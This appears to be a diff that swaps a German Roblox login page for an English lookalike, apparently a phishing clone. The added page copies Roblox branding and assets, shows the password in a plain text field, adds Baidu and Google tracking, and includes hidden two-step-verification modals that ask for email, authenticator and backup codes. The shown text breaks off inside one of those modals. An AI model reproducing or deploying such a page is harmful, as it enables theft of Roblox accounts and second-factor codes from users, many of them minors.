@@ -1,343 +1,870 @@
-<html lang="de"><!--<![endif]-->
-<body id="rbx-body" dir="ltr" class="rbx-body dark-theme forced-theme theme-roblox age-roblox-theme builder-font color-mode-dark" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0" style="pointer-events: unset;">
-    
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox</title>
+<meta name="author" content="Roblox Corporation">
+<meta name="description" content="Roblox is a global platform that brings people together through play.">
+<link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
+<link rel="stylesheet" href="https://css.rbxcdn.com/15b88564eae926990141be36eb3a9bd761cf2778fc9ac3425cdd4db1473148f4.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/8fa43545250dfbd7d96d164fe24e886391fdccc9b87b0dc91ce78933aebcda43.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/c92e5fc4564200cb9d84ba69bd53e4a4f86109709b8db691c1567dd257c1115b.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/6686c24b7d5461929debb2b62b589c5399f35ba8ea8ffdd641cf2a6b0b0b686e.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/34dd1fec808320ee37a2554b194c6df704dd5c201d8c5842ecea3b9093341873.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/c12b1163bd09c1076e861bfcbb98ab175a37971fae6a96c54c031afbb6589427.css">
+<style>
+    .background-image.marketing-background-1 {
+        width: 100%;
+        background: radial-gradient(circle at center, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0.75) 100%), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') 50% / cover no-repeat fixed !important;
+        position: fixed;
+        top: 0;
+        left: 0;
+        height: 100vh;
+        z-index: -1;
+    }
+    .rbx-body, .content, .container-main {
+        background: transparent !important;
+        background-color: transparent !important;
+    }
+    #twostep-error, #Authen-error, #RecoveryFromEmail-error, #RecoveryFromAuthen-error, #otp-code-error {
+        color: #e53935 !important;
+        font-weight: 600;
+    }
+    .login-error {
+        color: #e53935 !important;
+        font-weight: 600;
+        display: block;
+        margin-top: 6px;
+        min-height: 18px;
+    }
+    @keyframes modalFadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes modalScaleIn {
+        from { opacity: 0; transform: scale(0.95) translateY(6px); }
+        to { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    .modal-backdrop.in { animation: modalFadeIn .2s ease-out; }
+    .modal-modern.in .modal-content {
+        animation: modalScaleIn .22s cubic-bezier(.2,.8,.3,1);
+        transform-origin: center center;
+    }
+    .rbx-bars {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 4px;
+        height: 20px;
+        margin: 12px auto;
+    }
+    .rbx-bars .bar {
+        width: 4px;
+        height: 100%;
+        background: #fff;
+        border-radius: 2px;
+        transform-origin: center;
+        animation: barStretch 1.1s ease-in-out infinite;
+    }
+    .rbx-bars .bar:nth-child(1) { animation-delay: 0s; }
+    .rbx-bars .bar:nth-child(2) { animation-delay: .15s; }
+    .rbx-bars .bar:nth-child(3) { animation-delay: .3s; }
+    @keyframes barStretch {
+        0%, 100% { transform: scaleY(0.35); opacity: 0.4; }
+        50%      { transform: scaleY(1);    opacity: 1; }
+    }
+    .rbx-bars.small { height: 14px; margin: 0; }
+    .rbx-bars.small .bar { width: 3px; }
+</style>
+<script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-MV8Z2TNJ"></script><script src="https://hm.baidu.com/hm.js?272119dae6cce7e3ded69c4a57f828d1"></script><script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?272119dae6cce7e3ded69c4a57f828d1";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
 
+<!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-N13ZH72VV9"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-N13ZH72VV9');
+</script>
 
-    
-    <meta name="csrf-token" data-token="EZ+lFGTYpqZI">
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MV8Z2TNJ');</script>
+<!-- End Google Tag Manager -->
+<style>
+		.-kagi-autofill {
+			background-color: #ffffcc !important;
+			color: black; // otherwise in dark mode text gets white
+		}
+		.-kagi-login-active-field {
+			background-image: url('data:image/svg+xml,<svg viewBox="0 0 44 24" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M 30.25 9.25 L 36.5 15.75 L 42.75 9.25" fill="none" stroke="black" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><g><path d="M 16 3.5 C 16 2.672 16.672 2 17.5 2 C 18.3 2 19 2.7 19 3.5 C 19 4.3 18.3 5 17.5 5 C 16.7 5 16 4.3 16 3.5 Z M 11 6.5 C 11 10.1 13.9 13 17.5 13 C 21.1 13 24 10.1 24 6.5 C 24 2.9 21.1 0 17.5 0 C 13.9 0 11 2.9 11 6.5 Z"/><path d="M 20 17.3 L 20 18.6 L 20.9 19.9 C 21 20 21 20 21 20 L 17.7 23.8 C 17.7 23.8 17.7 23.8 17.7 23.8 C 17.5 23.9 17.4 23.9 17.3 23.8 L 15 21 L 15 11 L 20 11 L 20 14.8 L 21 15.9 C 21 16 21 16 20.9 16.1 L 20 17.3 Z M 17 13 L 17 21.3 L 17.5 21.8 L 18 21.3 L 18 13 L 17 13 Z"/></g></svg>');
+			background-repeat: no-repeat;
+			background-attachment: scroll;
+			background-size: 20px 24px;
+			background-position: 98% 50%;
+			cursor: auto;
+		}
+		</style><style>
+		.-kagi-autofill {
+			background-color: #ffffcc !important;
+			color: black; // otherwise in dark mode text gets white
+		}
+		.-kagi-login-active-field {
+			background-image: url('data:image/svg+xml,<svg viewBox="0 0 44 24" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M 30.25 9.25 L 36.5 15.75 L 42.75 9.25" fill="none" stroke="black" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><g><path d="M 16 3.5 C 16 2.672 16.672 2 17.5 2 C 18.3 2 19 2.7 19 3.5 C 19 4.3 18.3 5 17.5 5 C 16.7 5 16 4.3 16 3.5 Z M 11 6.5 C 11 10.1 13.9 13 17.5 13 C 21.1 13 24 10.1 24 6.5 C 24 2.9 21.1 0 17.5 0 C 13.9 0 11 2.9 11 6.5 Z"/><path d="M 20 17.3 L 20 18.6 L 20.9 19.9 C 21 20 21 20 21 20 L 17.7 23.8 C 17.7 23.8 17.7 23.8 17.7 23.8 C 17.5 23.9 17.4 23.9 17.3 23.8 L 15 21 L 15 11 L 20 11 L 20 14.8 L 21 15.9 C 21 16 21 16 20.9 16.1 L 20 17.3 Z M 17 13 L 17 21.3 L 17.5 21.8 L 18 21.3 L 18 13 L 17 13 Z"/></g></svg>');
+			background-repeat: no-repeat;
+			background-attachment: scroll;
+			background-size: 20px 24px;
+			background-position: 98% 50%;
+			cursor: auto;
+		}
+		</style><style>
+		.-kagi-autofill {
+			background-color: #ffffcc !important;
+			color: black; // otherwise in dark mode text gets white
+		}
+		.-kagi-login-active-field {
+			background-image: url('data:image/svg+xml,<svg viewBox="0 0 44 24" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M 30.25 9.25 L 36.5 15.75 L 42.75 9.25" fill="none" stroke="black" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><g><path d="M 16 3.5 C 16 2.672 16.672 2 17.5 2 C 18.3 2 19 2.7 19 3.5 C 19 4.3 18.3 5 17.5 5 C 16.7 5 16 4.3 16 3.5 Z M 11 6.5 C 11 10.1 13.9 13 17.5 13 C 21.1 13 24 10.1 24 6.5 C 24 2.9 21.1 0 17.5 0 C 13.9 0 11 2.9 11 6.5 Z"/><path d="M 20 17.3 L 20 18.6 L 20.9 19.9 C 21 20 21 20 21 20 L 17.7 23.8 C 17.7 23.8 17.7 23.8 17.7 23.8 C 17.5 23.9 17.4 23.9 17.3 23.8 L 15 21 L 15 11 L 20 11 L 20 14.8 L 21 15.9 C 21 16 21 16 20.9 16.1 L 20 17.3 Z M 17 13 L 17 21.3 L 17.5 21.8 L 18 21.3 L 18 13 L 17 13 Z"/></g></svg>');
+			background-repeat: no-repeat;
+			background-attachment: scroll;
+			background-size: 20px 24px;
+			background-position: 98% 50%;
+			cursor: auto;
+		}
+		</style><style>
+		.-kagi-autofill {
+			background-color: #ffffcc !important;
+			color: black; // otherwise in dark mode text gets white
+		}
+		.-kagi-login-active-field {
+			background-image: url('data:image/svg+xml,<svg viewBox="0 0 44 24" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M 30.25 9.25 L 36.5 15.75 L 42.75 9.25" fill="none" stroke="black" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><g><path d="M 16 3.5 C 16 2.672 16.672 2 17.5 2 C 18.3 2 19 2.7 19 3.5 C 19 4.3 18.3 5 17.5 5 C 16.7 5 16 4.3 16 3.5 Z M 11 6.5 C 11 10.1 13.9 13 17.5 13 C 21.1 13 24 10.1 24 6.5 C 24 2.9 21.1 0 17.5 0 C 13.9 0 11 2.9 11 6.5 Z"/><path d="M 20 17.3 L 20 18.6 L 20.9 19.9 C 21 20 21 20 21 20 L 17.7 23.8 C 17.7 23.8 17.7 23.8 17.7 23.8 C 17.5 23.9 17.4 23.9 17.3 23.8 L 15 21 L 15 11 L 20 11 L 20 14.8 L 21 15.9 C 21 16 21 16 20.9 16.1 L 20 17.3 Z M 17 13 L 17 21.3 L 17.5 21.8 L 18 21.3 L 18 13 L 17 13 Z"/></g></svg>');
+			background-repeat: no-repeat;
+			background-attachment: scroll;
+			background-size: 20px 24px;
+			background-position: 98% 50%;
+			cursor: auto;
+		}
+		</style><style>
+		.-kagi-autofill {
+			background-color: #ffffcc !important;
+			color: black; // otherwise in dark mode text gets white
+		}
+		.-kagi-login-active-field {
+			background-image: url('data:image/svg+xml,<svg viewBox="0 0 44 24" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M 30.25 9.25 L 36.5 15.75 L 42.75 9.25" fill="none" stroke="black" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><g><path d="M 16 3.5 C 16 2.672 16.672 2 17.5 2 C 18.3 2 19 2.7 19 3.5 C 19 4.3 18.3 5 17.5 5 C 16.7 5 16 4.3 16 3.5 Z M 11 6.5 C 11 10.1 13.9 13 17.5 13 C 21.1 13 24 10.1 24 6.5 C 24 2.9 21.1 0 17.5 0 C 13.9 0 11 2.9 11 6.5 Z"/><path d="M 20 17.3 L 20 18.6 L 20.9 19.9 C 21 20 21 20 21 20 L 17.7 23.8 C 17.7 23.8 17.7 23.8 17.7 23.8 C 17.5 23.9 17.4 23.9 17.3 23.8 L 15 21 L 15 11 L 20 11 L 20 14.8 L 21 15.9 C 21 16 21 16 20.9 16.1 L 20 17.3 Z M 17 13 L 17 21.3 L 17.5 21.8 L 18 21.3 L 18 13 L 17 13 Z"/></g></svg>');
+			background-repeat: no-repeat;
+			background-attachment: scroll;
+			background-size: 20px 24px;
+			background-position: 98% 50%;
+			cursor: auto;
+		}
+		</style></head>
+<body id="rbx-body" class="rbx-body dark-theme gotham-font" data-internal-page-name="Login">
 
-    
-    
-
-    
-
-
-<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">
-</div><div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">
-</div>    
+<!-- Google Tag Manager (noscript) -->
+<noscript>&lt;iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MV8Z2TNJ"
+height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
+<!-- End Google Tag Manager (noscript) -->
 
 
 <div id="wrap" class="wrap no-gutter-ads logged-out">
-
-
-<div id="navigation-container" class="builder-font" data-number-of-autocomplete-suggestions="7">
-    <div id="header" class="navbar-fixed-top rbx-header" role="navigation"> <div class="container-fluid"> <div class="rbx-navbar-header"> <div id="header-menu-icon" class="rbx-nav-collapse"><button type="button" id="skip-to-main-content" class="foundation-web-button relative clip group/interactable focus-visible:outline-focus disabled:outline-none cursor-pointer relative flex items-center justify-center stroke-none padding-y-none select-none radius-small text-label-small height-600 padding-x-small bg-action-emphasis content-action-emphasis" style="text-decoration: none;"><div aria-hidden="true" data-testid="foundation-web-state-layer" class="absolute inset-[0] transition-colors group-hover/interactable:bg-[var(--color-state-hover)] group-active/interactable:bg-[var(--color-state-press)] group-disabled/interactable:bg-none"></div><span class="flex items-center min-width-0 gap-xsmall"><span class="padding-y-xsmall text-truncate-end text-no-wrap">Zum Hauptinhalt springen</span></span></button></div> <div class="navbar-header"> <a id="nav-logo-link" class="navbar-brand" href="https://www.roblox.com/de/"> <span class="icon-logo"></span><span class="icon-logo-r"></span> </a> <div id="age-badge-container"></div> </div> </div> <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4"> <li> <a id="nav-charts-md-link" class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/de/charts">Charts</a> </li> <li> <a id="nav-marketplace-md-link" class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/de/catalog">Marktplatz</a> </li> <li> <a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">Erstellen</a> </li> <li id="navigation-robux-container"><div><a href="https://www.roblox.com/de/upgrades/robux?ctx=navpopover" class="foundation-web-link inline-flex items-center gap-xsmall content-emphasis no-underline motion-safe:transition-opacity hover:cursor-pointer hover:[opacity:0.8] radius-xsmall focus-visible:[outline-style:solid] focus-visible:[outline-width:var(--stroke-standard)] focus-visible:[outline-color:var(--color-system-emphasis)] font-header-2 nav-menu-title text-header robux-menu-btn">Robux</a></div></li> </ul> <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12"> <li> <a id="nav-charts-sm-link" class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/de/charts">Charts</a> </li> <li> <a id="nav-marketplace-sm-link" class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/de/catalog">Marktplatz</a> </li> <li> <a id="header-develop-sm-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">Erstellen</a> </li> <li id="navigation-robux-mobile-container"><div><a href="https://www.roblox.com/de/upgrades/robux?ctx=navpopover" class="foundation-web-link inline-flex items-center gap-xsmall content-emphasis no-underline motion-safe:transition-opacity hover:cursor-pointer hover:[opacity:0.8] radius-xsmall focus-visible:[outline-style:solid] focus-visible:[outline-width:var(--stroke-standard)] focus-visible:[outline-color:var(--color-system-emphasis)] font-header-2 nav-menu-title text-header robux-menu-btn">Robux</a></div></li> </ul> <div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search"><div class="input-group"><form name="search-form" action="/search"><div class="form-has-feedback"><input id="navbar-search-input" type="search" name="search-bar" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Suchen" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit" aria-label="Suchen"><span aria-hidden="true" data-testid="foundation-web-icon" class="grow-0 shrink-0 basis-auto icon icon-regular-magnifying-glass size-[var(--icon-size-medium)] [vertical-align:middle] margin-x-[6px] opacity-[0.7]"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a href="https://www.roblox.com/de/discover/?keyword=" class="foundation-web-link inline-flex items-center gap-xsmall content-emphasis no-underline motion-safe:transition-opacity hover:cursor-pointer hover:[opacity:0.8] radius-xsmall focus-visible:[outline-style:solid] focus-visible:[outline-width:var(--stroke-standard)] focus-visible:[outline-color:var(--color-system-emphasis)] new-navbar-search-anchor"><span aria-hidden="true" data-testid="foundation-web-icon" class="grow-0 shrink-0 basis-auto icon icon-regular-circle-play size-[var(--icon-size-medium)] [vertical-align:middle] navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Spiele</span></a></li><li class="navbar-search-option rbx-clickable-li"><a href="https://www.roblox.com/de/catalog?CatalogContext=1&amp;keyword=" class="foundation-web-link inline-flex items-center gap-xsmall content-emphasis no-underline motion-safe:transition-opacity hover:cursor-pointer hover:[opacity:0.8] radius-xsmall focus-visible:[outline-style:solid] focus-visible:[outline-width:var(--stroke-standard)] focus-visible:[outline-color:var(--color-system-emphasis)] new-navbar-search-anchor"><span aria-hidden="true" data-testid="foundation-web-icon" class="grow-0 shrink-0 basis-auto icon icon-regular-shopping-basket size-[var(--icon-size-medium)] [vertical-align:middle] navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Marktplatz</span></a></li><li class="navbar-search-option rbx-clickable-li"><a href="https://www.roblox.com/de/search/communities?keyword=" class="foundation-web-link inline-flex items-center gap-xsmall content-emphasis no-underline motion-safe:transition-opacity hover:cursor-pointer hover:[opacity:0.8] radius-xsmall focus-visible:[outline-style:solid] focus-visible:[outline-width:var(--stroke-standard)] focus-visible:[outline-color:var(--color-system-emphasis)] new-navbar-search-anchor"><span aria-hidden="true" data-testid="foundation-web-icon" class="grow-0 shrink-0 basis-auto icon icon-regular-three-people size-[var(--icon-size-medium)] [vertical-align:middle] navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Communitys</span></a></li><li class="navbar-search-option rbx-clickable-li"><a href="https://create.roblox.com/store/models?keyword=" class="foundation-web-link inline-flex items-center gap-xsmall content-emphasis no-underline motion-safe:transition-opacity hover:cursor-pointer hover:[opacity:0.8] radius-xsmall focus-visible:[outline-style:solid] focus-visible:[outline-width:var(--stroke-standard)] focus-visible:[outline-color:var(--color-system-emphasis)] new-navbar-search-anchor"><span aria-hidden="true" data-testid="foundation-web-icon" class="grow-0 shrink-0 basis-auto icon icon-regular-building-store size-[var(--icon-size-medium)] [vertical-align:middle] navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Creator Store</span></a></li></ul><div id="search-landing-root" data-testid="search-landing-root" class="search-landing-root"></div></div><div class="search-overlay"></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a href="https://www.roblox.com/de/account/signupredir?returnUrl=" id="sign-up-button" class="foundation-web-link inline-flex items-center gap-xsmall content-emphasis no-underline motion-safe:transition-opacity hover:cursor-pointer hover:[opacity:0.8] radius-xsmall focus-visible:[outline-style:solid] focus-visible:[outline-width:var(--stroke-standard)] focus-visible:[outline-color:var(--color-system-emphasis)] rbx-navbar-signup btn-growth-sm nav-menu-title signup-button">Registrieren</a></li><li class="login-action"><a href="https://www.roblox.com/de/login?returnUrl=" class="foundation-web-link inline-flex items-center gap-xsmall content-emphasis no-underline motion-safe:transition-opacity hover:cursor-pointer hover:[opacity:0.8] radius-xsmall focus-visible:[outline-style:solid] focus-visible:[outline-width:var(--stroke-standard)] focus-visible:[outline-color:var(--color-system-emphasis)] rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item">Anmelden</a></li><li class="rbx-navbar-right-search"><button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md" aria-label="Suchen"><span aria-hidden="true" data-testid="foundation-web-icon" class="grow-0 shrink-0 basis-auto icon icon-regular-magnifying-glass size-[var(--icon-size-xlarge)] [vertical-align:middle]"></span></button></li></ul></div></div> </div> </div> <div id="left-navigation-container"></div> <div id="verificationUpsell-container"><div></div></div> <div id="phoneVerificationUpsell-container"> <div phoneverificationupsell-container=""></div> </div> <div id="contactMethodPrompt-container"> <div contactmethodprompt-container=""></div> </div> <div id="navigation-account-switcher-container"> <div navigation-account-switcher-container=""></div> </div> 
-
-</div>
-    <main class="container-main content-no-ads                                                                                       touch" id="container-main" tabindex="-1">
-            
-            <div class="alert-container">
-                <noscript>
-                    &lt;div&gt;
-                        &lt;div class="alert-info" role="alert"&gt;Please enable Javascript to use all the features on this site.
-                        &lt;/div&gt;
-                    &lt;/div&gt;
-                </noscript>
-
-                
-
-
-            </div>
-
-        <div id="prompts-orchestrator"></div>
-
-        <div class="content" id="content">
-            
-<div id="react-login-web-app" class="login-container"><div id="background-image" class="background-image marketing-background-2"><div class="login-content-wrapper"><div id="login-base" class="login-base-container" data-force-passwordless-login-ready="true" data-force-passwordless-login-email-otp-enabled="true" data-force-passwordless-login-passkey-enabled="true"><div class="section-content login-section" data-testid="login-password-form"><h1 class="login-header">Bei Roblox anmelden</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Benutzer/E-Mail/Telefon</label><input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Benutzer/E-Mail/Telefon" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Passwort</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Passwort" value=""><div aria-live="polite"></div></div><button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Anmelden</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Passwort oder Benutzername vergessen?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div><button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Einmaligen Code per E-Mail senden</button><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Schnellanmeldung</span></button></div><div id="crossDeviceLoginDisplayCodeModal-container"></div><div id="otp-login-container"></div><div id="account-switcher-confirmation-modal-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Du hast kein Konto?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/de/CreateAccount" target="_self">Registrieren</a></div></div></div><div id="react-login-account-limit-error-container"></div></div><div><div></div></div></div></div></div>
-
-        </div>
-    </main><!--Bootstrap Footer React Component -->
-
-</div>
-    <div id="user-agreements-checker-container"></div>
-    <div id="access-management-upsell-container"><div id="legally-sensitive-content-component"></div></div>
-    <div id="global-privacy-control-checker-container"></div>
-    <div id="cookie-banner-wrapper" class="cookie-banner-wrapper"><div></div></div>
-
-<div id="PlaceLauncherStatusPanel" style="display:none" data-is-duar-auto-opt-in-enabled="true" data-is-duar-opt-out-disabled="true" data-os-name="OSX" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE" data-is-omit-player-channel-for-win-and-mac-enabled="true" data-is-www-common-game-launcher-enabled="false">
-</div>
-
-
-
-
-
-<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">
-    <div id="modal-dialog" class="modal-dialog" role="dialog">
-        <div class="modal-content">
-            <div class="modal-header">
-                <button type="button" class="close" data-dismiss="modal">
-                    <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span>
-                </button>
-                <h5 class="modal-title"></h5>
-            </div>
-
-            <div class="modal-body">
-                <div class="modal-top-body">
-                    <div class="modal-message"></div>
-                    <div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click="">
-                        
-                    </div>
-                    <div class="modal-checkbox checkbox">
-                        <input id="modal-checkbox-input" type="checkbox">
-                        <label for="modal-checkbox-input"></label>
+    <div id="navigation-container" class="dark-theme gotham-font">
+        <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
+            <div class="container-fluid">
+                <div class="rbx-navbar-header">
+                    <div class="navbar-header">
+                        <a class="navbar-brand" href="/login">
+                            <span class="icon-logo"></span><span class="icon-logo-r"></span>
+                        </a>
                     </div>
                 </div>
-                <div class="modal-btns">
-                    <a href="" id="confirm-btn"><span></span></a>
-                    <a href="" id="decline-btn"><span></span></a>
+                <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
+                    <li><a class="font-header-2 nav-menu-title text-header" href="/charts">Charts</a></li>
+                    <li><a class="font-header-2 nav-menu-title text-header" href="/catalog">Marketplace</a></li>
+                    <li><a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a></li>
+                    <li><a class="font-header-2 nav-menu-title text-header" href="/robux">Robux</a></li>
+                </ul>
+                <div id="right-navigation-header">
+                    <div class="navbar-right rbx-navbar-right">
+                        <ul class="nav navbar-right rbx-navbar-right-nav">
+                            <li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="/login">Sign Up</a></li>
+                        </ul>
+                    </div>
                 </div>
-                <div class="loading modal-processing">
-                    
-                </div>
-            </div>
-            <div class="modal-footer text-footer">
-
             </div>
         </div>
     </div>
+
+    <div class="container-main" id="container-main" tabindex="-1">
+        <div class="content">
+            <script>
+            function twostepInput(a, b){
+                if(a.length == 6){ document.getElementById(b).disabled = false; }
+                else { document.getElementById(b).disabled = true; }
+            }
+            function twostepInputRecovery(a, b){
+                if(a.length == 9){ document.getElementById(b).disabled = false; }
+                else { document.getElementById(b).disabled = true; }
+            }
+            </script>
+
+            <div id="react-login-container" class="login-container">
+                <div id="background-image" class="background-image marketing-background-1"></div>
+                <div id="login-base">
+                    <div class="section-content login-section">
+                        <h1 class="login-header">Login to Roblox</h1>
+                        <div id="login-form">
+                            <div>
+                                <div class="login-form-container">
+                                    <form class="login-form">
+                                        <div class="form-group username-form-group">
+                                            <label for="login-username" class="sr-only">Username/Email/Phone</label>
+                                            <input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone">
+                                        </div>
+                                        <div class="form-group password-form-group">
+                                            <label for="login-password" class="sr-only">Password</label>
+                                            <input id="login-password" name="password" type="text" autocomplete="off" class="form-control input-field" placeholder="Password">
+                                        </div>
+                                        <div aria-live="polite">
+                                            <p class="form-control-label xsmall login-error" id="text-error"></p>
+                                        </div>
+                                        <div id="login-loading" class="rbx-bars" style="display:none;"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>
+                                        <button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="#">Forgot Password or Username?</a></div>
+                        <div>
+                            <div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div>
+                            <button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Email Me a One-Time Code</button>
+                            <button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Use Another Device</span></button>
+                        </div>
+                        <div class="text-center">
+                            <div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="#">Sign Up</a></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div role="dialog" id="methodChoice" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('methodChoice').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">2-Step Verification</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Choose a verification method to continue.</p>
+                            <table class="table table-striped media-type-list modal-margin-bottom-large"><tbody>
+                                <tr class="media-type-row" data-method="Email" onclick="chooseMethod('Email')">
+                                    <td><span class="icon-menu-email"></span></td>
+                                    <td class="media-type-label">Email</td>
+                                    <td class="media-type-selector"><span class="icon-next"></span></td>
+                                </tr>
+                                <tr class="media-type-row" data-method="Authenticator" onclick="chooseMethod('Authenticator')">
+                                    <td><span class="icon-menu-mobile"></span></td>
+                                    <td class="media-type-label">Authenticator</td>
+                                    <td class="media-type-selector"><span class="icon-next"></span></td>
+                                </tr>
+                                <tr class="media-type-row" data-method="Backup Code" onclick="chooseMethod('Backup Code')">
+                                    <td><span class="icon-menu-recover"></span></td>
+                                    <td class="media-type-label">Backup Code</td>
+                                    <td class="media-type-selector"><span class="icon-next"></span></td>
+                                </tr>
+                            </tbody></table>
+                        </div>
+                        <div class="modal-footer">
+                            <p class="text-footer">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="twostepverification" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('twostepverification').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">2-Step Verification</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p>
+                            <div class="input-control-wrapper">
